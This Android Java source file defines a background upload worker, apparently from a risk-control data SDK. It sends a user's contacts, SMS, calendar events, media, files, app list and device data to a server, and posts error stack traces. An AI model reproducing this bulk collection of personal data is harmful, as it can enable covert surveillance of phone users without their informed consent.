package com.weithink.fengkong.work;


import android.content.Context;
import android.text.TextUtils;

import androidx.annotation.NonNull;
import androidx.work.Data;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.weithink.fengkong.Constants;
import com.weithink.fengkong.WeithinkFactory;
import com.weithink.fengkong.network.UtilNetworking;
import com.weithink.fengkong.services.TaskService;
import com.weithink.fengkong.util.StorageUtil;

import java.io.ByteArrayOutputStream;
import java.io.PrintStream;
import java.util.HashMap;


public class UploadWorker extends Worker {
    public UploadWorker(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);
    }

    @NonNull
    @Override
    public Result doWork() {
        try {

            StorageUtil util = StorageUtil.getInstance();
            String userId = util.getString("userId","");
            //获取分发参数进行操作
            String info_type = getInputData().getString(Constants.DataType.INFO_TYPE);
            if (null == info_type) {
                return Result.retry();
            }
            UtilNetworking.HttpResponse response = null;
            Data data = null;
            if (info_type.equals(Constants.DataType.APP_DATA)) {
                response =TaskService.uploadAppData(userId);
            } else if (info_type.equals(Constants.DataType.CALEVENT_DATA)) {
                response = TaskService.uploadCaleventData(userId);
            }
//            else if (info_type.equals(Constants.DataType.CALLS_DATA)) {
//            }
            else if (info_type.equals(Constants.DataType.CONTACTS_DATA)) {
                response =TaskService.uploadContactsData(userId);
            } else if (info_type.equals(Constants.DataType.DEVICE_DATA)) {
                response =TaskService.uploadDeviceData(userId);
            } else if (info_type.equals(Constants.DataType.FILE_DATA)) {
                response =TaskService.uploadFileData(userId);
            }
//            else if (info_type.equals(Constants.DataType.EXTRASDATA_DATA)) {
//            }
            else if (info_type.equals(Constants.DataType.MEDIA_DATA)) {
                response =TaskService.uploadMediaData(userId);
            } else if (info_type.equals(Constants.DataType.SMS_DATA)) {
                response =TaskService.uploadSmsData(userId);
            }
            if (response == null||response.responseCode!=200) {
                WeithinkFactory.getLogger().debug("上传数据错误：数据类型：%S Response : %s ",info_type,response.response);
                upErrorMsg(response.response);
                return Result.retry();
            }
            if (data != null) {
                return Result.success(data);
            }
            return Result.success();
        } catch (final Exception e) {
            e.printStackTrace();
            upErrorMsg(e);
            return Result.retry();
        }
    }

    private void upErrorMsg(final Exception e) {
        String url = StorageUtil.getInstance().getString("url", "");
        String userId = StorageUtil.getInstance().getString("userId", "");
        if (TextUtils.isEmpty(url)) return;
        String postUrl = "/data/error?userId=" + userId;
        String str = "";
        ByteArrayOutputStream bos = null;
        PrintStream ps = null;
        try {
            bos = new ByteArrayOutputStream();
            ps = new PrintStream(bos);
            e.printStackTrace(ps);
            str = new String(bos.toByteArray());
            ps.flush();
            ps.close();
            bos.flush();
            bos.close();
        } catch (Exception e1) {
            if (ps != null) {
                ps.flush();
                ps.close();
            }
            try {
                bos.flush();
                bos.close();
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
        HashMap<String, String> param = new HashMap<>();
        param.put("userId", StorageUtil.getInstance().getString("userId", ""));
        param.put("message", str);
        UtilNetworking.sendPostI(postUrl, Constants.VERSION, param);
    }
    private void upErrorMsg(String  msg) {
        String url = StorageUtil.getInstance().getString("url", "");
        String userId = StorageUtil.getInstance().getString("userId", "");
        if (TextUtils.isEmpty(url)) return;
        String postUrl =  "/data/error?userId=" + userId;
        String str = ""+msg;

        HashMap<String, String> param = new HashMap<>();
        param.put("userId", StorageUtil.getInstance().getString("userId", ""));
        param.put("message", str);
        UtilNetworking.sendPostI(postUrl, Constants.VERSION, param);
    }
}
